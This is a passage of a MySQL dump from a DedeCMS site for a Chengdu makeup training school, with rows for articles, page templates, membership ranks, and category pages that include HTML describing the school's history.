INSERT INTO dede_archives VALUES ('120', '21', '0', '1432453416', 'p', '1', '20', '0', '155', '0', '205期学员作品', '', '', 'admin', '未知', '/uploads/150524/1-150524154415A1.jpg', '1432453416', '1430977204', '1', '205期,学员,作品,205期,学员,作品,', '0', '0', '0', '0', '0', '0', '► 群丽化妆老师 带领 同学们牵手F5.6摄影 Makeup School 2015年3月30日，群丽 化妆老师带领学员们 牵手 F5.6摄影俱乐部 的会员们共同打造了一次已民国为主题的历史文化摄影。 在整个化妆', '', '1', '0', '0', '112');
INSERT INTO dede_archives VALUES ('121', '21', '0', '1432453009', 'c,p', '1', '20', '0', '85', '0', '213期学员作品', '', '', 'admin', '未知', '/uploads/150524/1-150524153G03A.jpg', '1432453009', '1430977238', '1', '213期,学员,作品,213期,学员,作品,', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '113');
INSERT INTO dede_archives VALUES ('122', '16', '0', '1431155713', 'p', '1', '1', '0', '175', '0', '4月26日学生婚礼跟妆纪实', '', '', '杨老师', '未知', '/uploads/allimg/150509/1-150509143405Z0-lp.jpg', '1431155713', '1431153753', '1', '群丽化妆学校 婚礼 纪实', '0', '0', '0', '0', '0', '0', '2015年4月26日。群丽化妆学校导师带领着学员参加了晶晶的婚礼化妆。', '', '1', '0', '0', '114');
INSERT INTO dede_archives VALUES ('123', '12', '0', '1432535686', 'p', '1', '17', '0', '101', '0', '韩式半永久性定妆术', 'Korean semi permanent makeup operati', '', '张老师', '课程组', '/uploads/150525/1-15052513024U33.jpg', '1432535686', '1431506636', '1', '半永久性定妆术,化妆培训,成都化妆培训学校', '0', '0', '0', '0', '0', '0', '学期：5-7天，价格原价2980.特价2680（赠送全套学习用品用具及色料和学习机） 课程优势：名师授课，一次报名。终身免复训全套技术安全，高效，无痛，不肿学员零基础，可达到纹绣师', '', '1', '0', '0', '115');
INSERT INTO dede_archives VALUES ('124', '16', '0', '1431833793', 'p', '1', '1', '0', '198', '0', '新学员3周职业装考试', '', '', 'admin', '未知', '/uploads/allimg/150517/1-15051G13341M2-lp.jpg', '1431833793', '1431833722', '1', '群丽化妆 职业装考试要点', '0', '0', '0', '0', '0', '0', '流金5月，群丽化妆学校杨洁老师化妆班迎来了三周以来的新学员考试。 而这次考试的主题则是定义在现代社会中、政府机关、学校、公司等工作人员所需的职业装。 职业装与俏皮可爱', '', '1', '0', '0', '116');
INSERT INTO dede_archives VALUES ('125', '16', '0', '1431925307', 'p', '1', '1', '0', '56', '0', '婚纱彩妆新学员考试作品', '', '', '杨老师', '未知', '/uploads/allimg/150517/1-15051G20625R9-lp.jpg', '1431925307', '1431835816', '1', '群丽化妆学校 新学员作品 新娘妆', '0', '0', '0', '0', '0', '0', '群丽化妆学校新学员新娘妆考核', '', '1', '0', '0', '117');
INSERT INTO dede_archives VALUES ('126', '16', '0', '1431852638', 'p', '1', '1', '0', '169', '0', '指尖上的艺术', '', '', 'admin', '未知', '/uploads/allimg/150517/1-15051GA12cN-lp.jpg', '1431852638', '1431853128', '1', '指尖,上,的,艺术,指尖,上,的,艺术,画展,', '0', '0', '0', '0', '0', '0', '指尖上的艺术画展~', '', '1', '0', '0', '118');
INSERT INTO dede_archives VALUES ('127', '11', '0', '1432108241', 'p', '1', '22', '0', '66', '0', '实习基地', '', '', 'admin', '未知', '/uploads/150520/1-15052015511J63.jpg', '1432108241', '1432108300', '1', '', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '119');
INSERT INTO dede_archives VALUES ('128', '11', '0', '1432108315', 'p', '1', '22', '0', '172', '0', '先进单位', '', '', 'admin', '未知', '/uploads/150520/1-15052015520T03.jpg', '1432108315', '1432108341', '1', '', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '120');
INSERT INTO dede_archives VALUES ('129', '11', '0', '1432108441', 'p', '1', '22', '0', '54', '0', '优秀学校', '', '', 'admin', '未知', '/uploads/150520/1-150520155422438.jpg', '1432108441', '1432108470', '1', '', '0', '0', '0', '0', '0', '0', '', '', '1', '0', '0', '121');

-- ----------------------------
-- Table structure for `dede_arcmulti`
-- ----------------------------
DROP TABLE IF EXISTS `dede_arcmulti`;
CREATE TABLE `dede_arcmulti` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `tagid` char(60) NOT NULL DEFAULT '',
  `uptime` int(11) NOT NULL DEFAULT '0',
  `innertext` varchar(255) NOT NULL DEFAULT '',
  `pagesize` int(11) NOT NULL DEFAULT '0',
  `arcids` text NOT NULL,
  `ordersql` varchar(255) DEFAULT NULL,
  `addfieldsSql` varchar(255) DEFAULT NULL,
  `addfieldsSqlJoin` varchar(255) DEFAULT NULL,
  `attstr` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_arcmulti
-- ----------------------------
INSERT INTO dede_arcmulti VALUES ('1', 'tagbd9799193799b22766deba9e5df24d6b', '1428743688', '<dd><a href=\"[field:arcurl/]\">[field:title/]</a><em>[field:pubdate function=\"GetDateTimeMK(@me)\"/]</em></dd>\r\n                        {/dede:arclist }\r\n                    </dl>\r\n                    <a href=\"\">VIEW MORE</a>\r\n                </div>\r\n      ', '5', '2,1', ' ORDER BY arc.sortrank desc', '', '', 'a:16:{s:3:\"row\";i:10;s:8:\"titlelen\";i:30;s:7:\"infolen\";i:160;s:8:\"imgwidth\";i:120;s:9:\"imgheight\";i:120;s:8:\"listtype\";s:3:\"all\";s:5:\"arcid\";i:0;s:9:\"channelid\";i:0;s:7:\"orderby\";s:7:\"default\";s:8:\"orderWay\";s:4:\"desc\";s:6:\"subday\";i:0;s:8:\"pagesize\";s:1:\"5\";s:7:\"keyword\";s:0:\"\";s:10:\"tablewidth\";s:4:\"100%\";s:3:\"col\";i:1;s:8:\"colWidth\";s:4:\"100%\";}');
INSERT INTO dede_arcmulti VALUES ('2', 'tag08e09564c809e2b6a505ded1ec8adee8', '1428745226', '<div>\r\n                <h5>[field:title/]</h5>\r\n                <span>[field:pubdate function=\"GetDateTimeMK(@me)\"/]</span>\r\n            </div>\r\n            <p class=\"dash\">\r\n                [field:description/]\r\n            </p>', '1', '2,1', ' ORDER BY arc.sortrank desc', '', '', 'a:16:{s:3:\"row\";i:10;s:8:\"titlelen\";i:30;s:7:\"infolen\";i:160;s:8:\"imgwidth\";i:120;s:9:\"imgheight\";i:120;s:8:\"listtype\";s:3:\"all\";s:5:\"arcid\";i:0;s:9:\"channelid\";i:0;s:7:\"orderby\";s:7:\"pubdate\";s:8:\"orderWay\";s:4:\"desc\";s:6:\"subday\";i:0;s:8:\"pagesize\";s:1:\"1\";s:7:\"keyword\";s:0:\"\";s:10:\"tablewidth\";s:4:\"100%\";s:3:\"col\";i:1;s:8:\"colWidth\";s:4:\"100%\";}');
INSERT INTO dede_arcmulti VALUES ('3', 'tage90f0049ce42a82b1cb72e01c22217cf', '1428745113', '<div>\r\n                <h5>[field:title/]</h5>\r\n                <span>[field:pubdate function=\"GetDateTimeMK(@me)\"/]</span>\r\n            </div>\r\n            <p class=\"dash\">\r\n                [field:description/]\r\n            </p>', '1', '2,1', ' ORDER BY arc.sortrank desc', '', '', 'a:16:{s:3:\"row\";i:10;s:8:\"titlelen\";i:30;s:7:\"infolen\";i:160;s:8:\"imgwidth\";i:120;s:9:\"imgheight\";i:120;s:8:\"listtype\";s:3:\"all\";s:5:\"arcid\";i:0;s:9:\"channelid\";i:0;s:7:\"orderby\";s:7:\"pubdate\";s:8:\"orderWay\";s:4:\"desc\";s:6:\"subday\";i:0;s:8:\"pagesize\";s:1:\"1\";s:7:\"keyword\";s:0:\"\";s:10:\"tablewidth\";s:4:\"100%\";s:3:\"col\";i:1;s:8:\"colWidth\";s:4:\"100%\";}');
INSERT INTO dede_arcmulti VALUES ('4', 'index', '1432551211', '<div>\r\n                <h5><a href=\"[field:arcurl/]\" target=\"_blank\">[field:title/]</a></h5>\r\n                <span>[field:pubdate function=\"GetDateTimeMK(@me)\"/]</span>\r\n            </div>\r\n            <p class=\"dash\">\r\n                [field:description', '5', '82,125,126,124,122,110,111,2,98,69', ' ORDER BY arc.sortrank desc', '', '', 'a:16:{s:3:\"row\";i:10;s:8:\"titlelen\";i:30;s:7:\"infolen\";i:160;s:8:\"imgwidth\";i:120;s:9:\"imgheight\";i:120;s:8:\"listtype\";s:3:\"all\";s:5:\"arcid\";i:0;s:9:\"channelid\";i:0;s:7:\"orderby\";s:7:\"pubdate\";s:8:\"orderWay\";s:4:\"desc\";s:6:\"subday\";i:0;s:8:\"pagesize\";s:1:\"5\";s:7:\"keyword\";s:0:\"\";s:10:\"tablewidth\";s:4:\"100%\";s:3:\"col\";i:1;s:8:\"colWidth\";s:4:\"100%\";}');

-- ----------------------------
-- Table structure for `dede_arcrank`
-- ----------------------------
DROP TABLE IF EXISTS `dede_arcrank`;
CREATE TABLE `dede_arcrank` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `rank` smallint(6) NOT NULL DEFAULT '0',
  `membername` char(20) NOT NULL DEFAULT '',
  `adminrank` smallint(6) NOT NULL DEFAULT '0',
  `money` smallint(8) unsigned NOT NULL DEFAULT '500',
  `scores` mediumint(8) NOT NULL DEFAULT '0',
  `purviews` mediumtext,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_arcrank
-- ----------------------------
INSERT INTO dede_arcrank VALUES ('1', '0', '开放浏览', '5', '0', '0', '');
INSERT INTO dede_arcrank VALUES ('2', '-1', '待审核稿件', '0', '0', '0', '');
INSERT INTO dede_arcrank VALUES ('3', '10', '注册会员', '5', '0', '100', '');
INSERT INTO dede_arcrank VALUES ('4', '50', '中级会员', '5', '300', '200', '');
INSERT INTO dede_arcrank VALUES ('5', '100', '高级会员', '5', '800', '500', '');
INSERT INTO dede_arcrank VALUES ('6', '20', '低级会员', '5', '0', '500', '');
INSERT INTO dede_arcrank VALUES ('7', '150', '给力会员', '5', '1000', '500', '');
INSERT INTO dede_arcrank VALUES ('8', '180', '超能会员', '5', '1100', '500', '');

-- ----------------------------
-- Table structure for `dede_arctiny`
-- ----------------------------
DROP TABLE IF EXISTS `dede_arctiny`;
CREATE TABLE `dede_arctiny` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `typeid2` varchar(90) NOT NULL DEFAULT '0',
  `arcrank` smallint(6) NOT NULL DEFAULT '0',
  `channel` smallint(5) NOT NULL DEFAULT '1',
  `senddate` int(10) unsigned NOT NULL DEFAULT '0',
  `sortrank` int(10) unsigned NOT NULL DEFAULT '0',
  `mid` mediumint(8) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  KEY `sortrank` (`sortrank`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=131 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_arctiny
-- ----------------------------
INSERT INTO dede_arctiny VALUES ('1', '16', '0', '0', '1', '1428741732', '1429067692', '1');
INSERT INTO dede_arctiny VALUES ('37', '12', '0', '-1', '1', '1429067612', '1429067687', '1');
INSERT INTO dede_arctiny VALUES ('2', '17', '0', '0', '1', '1428743213', '1429343881', '1');
INSERT INTO dede_arctiny VALUES ('10', '2', '0', '-1', '1', '1428894950', '1428895406', '1');
INSERT INTO dede_arctiny VALUES ('11', '12', '0', '-1', '1', '1428895021', '1429064214', '1');
INSERT INTO dede_arctiny VALUES ('12', '2', '0', '-1', '17', '1428895891', '1428912140', '1');
INSERT INTO dede_arctiny VALUES ('22', '22', '0', '-1', '18', '1428991330', '1428991581', '1');
INSERT INTO dede_arctiny VALUES ('23', '21', '0', '-1', '18', '1428993143', '1428993233', '1');
INSERT INTO dede_arctiny VALUES ('24', '21', '0', '-1', '18', '1428993323', '1428993710', '1');
INSERT INTO dede_arctiny VALUES ('25', '21', '0', '-1', '18', '1428993887', '1428993876', '1');
INSERT INTO dede_arctiny VALUES ('46', '11', '0', '0', '22', '1429151256', '1429151241', '1');
INSERT INTO dede_arctiny VALUES ('47', '11', '0', '0', '22', '1429151430', '1429151513', '1');
INSERT INTO dede_arctiny VALUES ('48', '11', '0', '0', '22', '1429151496', '1429151617', '1');
INSERT INTO dede_arctiny VALUES ('49', '36', '0', '0', '18', '1429152357', '1429246774', '1');
INSERT INTO dede_arctiny VALUES ('51', '18', '0', '0', '1', '1429152900', '1429152768', '1');
INSERT INTO dede_arctiny VALUES ('52', '22', '0', '0', '19', '1429154505', '1429256668', '1');
INSERT INTO dede_arctiny VALUES ('57', '17', '0', '0', '1', '1429155308', '1429258454', '1');
INSERT INTO dede_arctiny VALUES ('58', '22', '0', '0', '19', '1429155796', '1429260292', '1');
INSERT INTO dede_arctiny VALUES ('59', '33', '0', '0', '18', '1429155991', '1430812278', '1');
INSERT INTO dede_arctiny VALUES ('60', '33', '0', '0', '18', '1429156160', '1430812163', '1');
INSERT INTO dede_arctiny VALUES ('61', '22', '0', '0', '19', '1429156366', '1429259722', '1');
INSERT INTO dede_arctiny VALUES ('62', '34', '0', '0', '18', '1429156455', '1429246579', '1');
INSERT INTO dede_arctiny VALUES ('63', '35', '0', '0', '18', '1429156576', '1430812215', '1');
INSERT INTO dede_arctiny VALUES ('64', '36', '0', '0', '18', '1429156803', '1430812240', '1');
INSERT INTO dede_arctiny VALUES ('69', '16', '0', '0', '1', '1429242894', '1429262849', '1');
INSERT INTO dede_arctiny VALUES ('65', '21', '0', '0', '20', '1429157160', '1429249636', '1');
INSERT INTO dede_arctiny VALUES ('66', '21', '0', '0', '20', '1429162394', '1429248284', '1');
INSERT INTO dede_arctiny VALUES ('68', '40', '0', '0', '1', '1429164818', '1429253788', '1');
INSERT INTO dede_arctiny VALUES ('70', '16', '0', '0', '1', '1429246407', '1429246487', '1');
INSERT INTO dede_arctiny VALUES ('71', '16', '0', '0', '1', '1429247560', '1429258143', '1');
INSERT INTO dede_arctiny VALUES ('72', '16', '0', '0', '1', '1429248289', '1429248327', '1');
INSERT INTO dede_arctiny VALUES ('73', '16', '0', '0', '1', '1429249721', '1429257988', '1');
INSERT INTO dede_arctiny VALUES ('74', '16', '0', '0', '1', '1429250478', '1429257542', '1');
INSERT INTO dede_arctiny VALUES ('75', '21', '0', '0', '20', '1429251056', '1429250961', '1');
INSERT INTO dede_arctiny VALUES ('76', '21', '0', '0', '20', '1429251114', '1429251080', '1');
INSERT INTO dede_arctiny VALUES ('77', '21', '0', '0', '20', '1429251146', '1429251116', '1');
INSERT INTO dede_arctiny VALUES ('78', '21', '0', '0', '20', '1429251187', '1432454252', '1');
INSERT INTO dede_arctiny VALUES ('79', '21', '0', '0', '20', '1429251212', '1432454181', '1');
INSERT INTO dede_arctiny VALUES ('80', '21', '0', '0', '20', '1429251241', '1429251215', '1');
INSERT INTO dede_arctiny VALUES ('81', '17', '0', '0', '1', '1429253254', '1429258042', '1');
INSERT INTO dede_arctiny VALUES ('82', '17', '0', '0', '1', '1429253798', '1432092225', '1');
INSERT INTO dede_arctiny VALUES ('85', '18', '0', '0', '1', '1429258813', '1429258826', '1');
INSERT INTO dede_arctiny VALUES ('86', '18', '0', '0', '1', '1429260165', '1429260383', '1');
INSERT INTO dede_arctiny VALUES ('87', '18', '0', '0', '1', '1429260626', '1429260637', '1');
INSERT INTO dede_arctiny VALUES ('88', '22', '0', '0', '19', '1429260774', '1429260410', '1');
INSERT INTO dede_arctiny VALUES ('89', '22', '0', '0', '19', '1429260998', '1429260812', '1');
INSERT INTO dede_arctiny VALUES ('90', '18', '0', '0', '1', '1429261332', '1429260668', '1');
INSERT INTO dede_arctiny VALUES ('91', '18', '0', '0', '1', '1429262318', '1429262527', '1');
INSERT INTO dede_arctiny VALUES ('92', '12', '0', '0', '17', '1429327777', '1432464010', '1');
INSERT INTO dede_arctiny VALUES ('93', '13', '0', '0', '17', '1429328847', '1432182764', '1');
INSERT INTO dede_arctiny VALUES ('94', '14', '0', '0', '17', '1429329042', '1432183528', '1');
INSERT INTO dede_arctiny VALUES ('95', '15', '0', '0', '17', '1429329845', '1432183761', '1');
INSERT INTO dede_arctiny VALUES ('96', '23', '0', '0', '21', '1429330284', '1432018549', '1');
INSERT INTO dede_arctiny VALUES ('98', '18', '0', '0', '1', '1429335327', '1429334886', '1');
INSERT INTO dede_arctiny VALUES ('99', '40', '0', '0', '1', '1429495285', '1429495111', '1');
INSERT INTO dede_arctiny VALUES ('100', '12', '0', '0', '17', '1429690863', '1432535942', '1');
INSERT INTO dede_arctiny VALUES ('102', '12', '0', '0', '17', '1429692024', '1432535976', '1');
INSERT INTO dede_arctiny VALUES ('101', '15', '0', '0', '17', '1429690913', '1432183776', '1');
INSERT INTO dede_arctiny VALUES ('103', '12', '0', '0', '17', '1429692564', '1432522865', '1');
INSERT INTO dede_arctiny VALUES ('104', '12', '0', '0', '17', '1429693053', '1432522075', '1');
INSERT INTO dede_arctiny VALUES ('105', '12', '0', '0', '17', '1429693732', '1432521522', '1');
INSERT INTO dede_arctiny VALUES ('106', '13', '0', '0', '17', '1429694390', '1432180368', '1');
INSERT INTO dede_arctiny VALUES ('107', '13', '0', '0', '17', '1429694807', '1432184469', '1');
INSERT INTO dede_arctiny VALUES ('108', '23', '0', '0', '21', '1429842378', '1432018535', '1');
INSERT INTO dede_arctiny VALUES ('109', '23', '0', '0', '21', '1429842490', '1432018294', '1');
INSERT INTO dede_arctiny VALUES ('110', '16', '0', '0', '1', '1430206007', '1430808332', '1');
INSERT INTO dede_arctiny VALUES ('111', '16', '0', '0', '1', '1430715728', '1430728751', '1');
INSERT INTO dede_arctiny VALUES ('112', '34', '0', '0', '18', '1430810611', '1430811076', '1');
INSERT INTO dede_arctiny VALUES ('113', '34', '0', '0', '18', '1430811844', '1430811562', '1');
INSERT INTO dede_arctiny VALUES ('114', '34', '0', '0', '18', '1430811941', '1430811894', '1');
INSERT INTO dede_arctiny VALUES ('115', '34', '0', '0', '18', '1430812105', '1430811944', '1');
INSERT INTO dede_arctiny VALUES ('116', '21', '0', '0', '20', '1430976970', '1430976906', '1');
INSERT INTO dede_arctiny VALUES ('117', '21', '0', '0', '20', '1430977056', '1432453741', '1');
INSERT INTO dede_arctiny VALUES ('118', '21', '0', '0', '20', '1430977116', '1432453892', '1');
INSERT INTO dede_arctiny VALUES ('119', '21', '0', '0', '20', '1430977144', '1432454588', '1');
INSERT INTO dede_arctiny VALUES ('120', '21', '0', '0', '20', '1430977204', '1432453416', '1');
INSERT INTO dede_arctiny VALUES ('121', '21', '0', '0', '20', '1430977238', '1432453009', '1');
INSERT INTO dede_arctiny VALUES ('122', '16', '0', '0', '1', '1431153753', '1431155713', '1');
INSERT INTO dede_arctiny VALUES ('123', '12', '0', '0', '17', '1431506636', '1432535686', '1');
INSERT INTO dede_arctiny VALUES ('124', '16', '0', '0', '1', '1431833722', '1431833793', '1');
INSERT INTO dede_arctiny VALUES ('125', '16', '0', '0', '1', '1431835816', '1431925307', '1');
INSERT INTO dede_arctiny VALUES ('126', '16', '0', '0', '1', '1431853128', '1431852638', '1');
INSERT INTO dede_arctiny VALUES ('127', '11', '0', '0', '22', '1432108300', '1432108241', '1');
INSERT INTO dede_arctiny VALUES ('128', '11', '0', '0', '22', '1432108341', '1432108315', '1');
INSERT INTO dede_arctiny VALUES ('129', '11', '0', '0', '22', '1432108470', '1432108441', '1');

-- ----------------------------
-- Table structure for `dede_arctype`
-- ----------------------------
DROP TABLE IF EXISTS `dede_arctype`;
CREATE TABLE `dede_arctype` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `reid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `topid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `sortrank` smallint(5) unsigned NOT NULL DEFAULT '50',
  `typename` char(30) NOT NULL DEFAULT '',
  `typedir` char(60) NOT NULL DEFAULT '',
  `isdefault` smallint(6) NOT NULL DEFAULT '0',
  `defaultname` char(15) NOT NULL DEFAULT 'index.html',
  `issend` smallint(6) NOT NULL DEFAULT '0',
  `channeltype` smallint(6) DEFAULT '1',
  `maxpage` smallint(6) NOT NULL DEFAULT '-1',
  `ispart` smallint(6) NOT NULL DEFAULT '0',
  `corank` smallint(6) NOT NULL DEFAULT '0',
  `tempindex` char(50) NOT NULL DEFAULT '',
  `templist` char(50) NOT NULL DEFAULT '',
  `temparticle` char(50) NOT NULL DEFAULT '',
  `namerule` char(50) NOT NULL DEFAULT '',
  `namerule2` char(50) NOT NULL DEFAULT '',
  `modname` char(20) NOT NULL DEFAULT '',
  `description` char(150) NOT NULL DEFAULT '',
  `keywords` varchar(60) NOT NULL DEFAULT '',
  `seotitle` varchar(80) NOT NULL DEFAULT '',
  `moresite` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `sitepath` char(60) NOT NULL DEFAULT '',
  `siteurl` char(50) NOT NULL DEFAULT '',
  `ishidden` smallint(6) NOT NULL DEFAULT '0',
  `cross` tinyint(1) NOT NULL DEFAULT '0',
  `crossid` text,
  `content` text,
  `smalltypes` text,
  PRIMARY KEY (`id`),
  KEY `reid` (`reid`,`isdefault`,`channeltype`,`ispart`,`corank`,`topid`,`ishidden`) USING BTREE,
  KEY `sortrank` (`sortrank`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=42 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_arctype
-- ----------------------------
INSERT INTO dede_arctype VALUES ('1', '0', '0', '1', '关于我们', '{cmspath}/a/guanyuwomen', '-1', 'index.html', '1', '1', '-1', '1', '0', 'qunli/aboutUs.htm', 'qunli/aboutUs.htm', 'qunli/aboutUs.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/guanyuwomen', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('2', '0', '0', '4', '专业课程', '{cmspath}/a/zhuanyekecheng', '1', 'index.html', '1', '17', '-1', '0', '0', 'qunli/professionalSubject.htm', 'qunli/professionalSubject.htm', 'qunli/classIntro.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/zhuanyekecheng', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('3', '0', '0', '2', '新闻动态', '{cmspath}/a/xinwendongtai', '1', 'index.html', '1', '1', '-1', '0', '0', 'qunli/news.htm', 'qunli/news.htm', 'qunli/news_artcle.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/xinwendongtai', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('4', '0', '0', '3', '学员师资', '{cmspath}/a/xueyuanshizi', '1', 'index.html', '1', '1', '-1', '0', '0', 'qunli/CollegeTeachers.htm', 'qunli/CollegeTeachers.htm', 'qunli/CollegeTeachers.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '', '', '0', '0', '', '', '');
INSERT INTO dede_arctype VALUES ('5', '0', '0', '5', '招生就业', '{cmspath}/a/zhaoshengjiuye', '1', 'index.html', '1', '1', '-1', '0', '0', 'qunli/recruitStudent.htm', 'qunli/recruitStudent.htm', 'qunli/recruitStudent.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '', '', '0', '0', '', '', '');
INSERT INTO dede_arctype VALUES ('6', '0', '0', '6', '商务合作', '{cmspath}/a/shangwuhezuo', '-1', 'index.html', '1', '1', '-1', '0', '0', 'qunli/businessCooperation.htm', 'qunli/businessCooperation.htm', 'qunli/businessCooperation.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/shangwuhezuo', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('7', '0', '0', '7', '联系我们', '{cmspath}/a/lianxiwomen', '-1', 'index.html', '1', '1', '-1', '1', '0', 'qunli/contactUs.htm', 'qunli/contactUs.htm', 'qunli/contactUs.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/lianxiwomen', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('8', '1', '1', '50', '学校介绍', '/a/guanyuwomen/schoolIntro', '1', 'index.html', '1', '1', '-1', '0', '0', 'qunli/brandculture.htm', 'qunli/brandculture.htm', 'qunli/brandculture.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/guanyuwomen', '', '0', '0', '', '<div class=\"biaoti r5px\" style=\"text-align: center;\">\r\n	<img alt=\"\" src=\"/uploads/allimg/150523/1-150523151Q1B6.jpg\" style=\"width: 1000px; height: 2323px;\" /></div>\r\n', '');
INSERT INTO dede_arctype VALUES ('9', '1', '1', '50', '办学文化', '/a/guanyuwomen/brandCulture', '1', 'index.html', '1', '1', '-1', '1', '0', 'qunli/brandculture.htm', 'qunli/brandculture.htm', 'qunli/brandculture.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/guanyuwomen', '', '0', '0', '', '<div style=\"text-align: center;\">\r\n	<br />\r\n	<span style=\"color:#993333;\"><span style=\"font-size: 36px; font-family: verdana, geneva, sans-serif;\">群丽化妆学校</span></span><br />\r\n	<br />\r\n	<hr />\r\n	<div style=\"text-align: left;\">\r\n		<span style=\"color:#3399cc;\"><span style=\"font-size:20px;\">&nbsp;<br />\r\n		&nbsp; 群丽化妆学校于2004年2月由群丽婚纱摄影集团投资建校。<br />\r\n		&nbsp; 是在新形式下组建的专业时尚学校，目前是西南地区首批大规模培养美容，化妆造型，摄影专业人才的基地。</span></span></div>\r\n</div>\r\n<pre>\r\n</pre>\r\n<span style=\"color:#b22222;\"><span style=\"font-size:20px;\"><img alt=\"\" src=\"/uploads/allimg/150520/1-15052011592M34.jpg\" />&nbsp;&nbsp;</span></span><br />\r\n<span style=\"font-size:20px;\"><span style=\"color:#cc6633;\">&nbsp; 群丽化妆学校隶属于西南地区规模最大的婚纱摄影机构之一&ldquo;群丽婚纱摄影集团&rdquo;。</span></span><span style=\"color:#cc6633;\"> <span style=\"font-size:20px;\"> 婚纱摄影集团1996年正式进入成都婚纱业，多年来，已经发展成为西南地区规模最大的外资机构之一。 现旗下共拥有直属分支机构十余家，囊括了大型成都婚纱影楼、化妆学校、SPA水疗馆、专业婚纱礼服馆、男士西服馆、平面及影视制作等行业、营业面积数万平方米，在职员工600余人.</span></span><br />\r\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style=\"text-align: center;\">&nbsp;&nbsp;</span><br />\r\n<span style=\"color:#cc6633;\"><span style=\"font-size:20px;\">&nbsp; 成都群丽化妆学校，投入雄厚的教学资金，引导先进的教学设备，凭借丰富的教学经验，邀请台湾资深形象设计师和摄影师对课程进行合理设置。并聘请资深化妆师和摄影师进行教学，为学员提供专业的技术课程。</span> <span style=\"font-size:20px;\"> 在整个学习过程中学校采用&ldquo;理论与实践相结合，注重实际运用&rdquo;的教学方式。并为每一位学员提供优良的教学环境，让每位学员在丰富完善的理论中能参与实践，从而提高专业的实质升华。</span> <span style=\"font-size:20px;\"> 群丽化妆学校为提高从业人员的整体水平，秉承&ldquo;培养技术精英&rdquo;宗旨，坚持为社会的发展提供更专业、更优秀的人力资源并持续在行业内获得更多的合作伙伴。</span></span><br />\r\n<div style=\"text-align: center;\">\r\n	<span style=\"color:#cc6633;\"><span style=\"font-size:20px;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<img alt=\"\" src=\"/uploads/allimg/150521/1-15052109593B29.jpg\" style=\"width: 596px; height: 416px;\" /> </span></span></div>\r\n<span style=\"color:#cc6633;\"><span style=\"font-size:20px;\">&nbsp; 群丽化妆学校建校来，在坚持学院派教育的基础上，深入研究我国民族艺术的美学精神并广泛吸收西方现代化妆中的艺术成果。教学中，注重培养学生的专业水平与道德修养，将学生的化妆基本功、化妆基本技能、化妆基础理论与化妆造型独创性素质相结合；在坚持理论与实践相结、合的基础上，群丽化妆学校积极参加时尚界和行业内各项重要活动。</span> <span style=\"font-size:20px;\"> 2007年，&ldquo;群丽婚纱&rdquo;为指定摄影单位，如2008年北京奥运会开闭幕式、2009年国庆60周年阅兵式、第59届世界小姐大赛、2012年参加国际非遗博览园叁女叁活动、中国国际时装周等国内外具有广泛影响力的活动与赛事。</span><br />\r\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<img alt=\"\" src=\"/uploads/allimg/150520/1-1505201J232450.jpg\" style=\"height: 540px; width: 800px;\" /><br />\r\n<span style=\"font-size:20px;\">&nbsp; </span></span><br />\r\n<div>\r\n	<span style=\"color:#cc6633;\"><span style=\"font-size:20px;\">&nbsp; 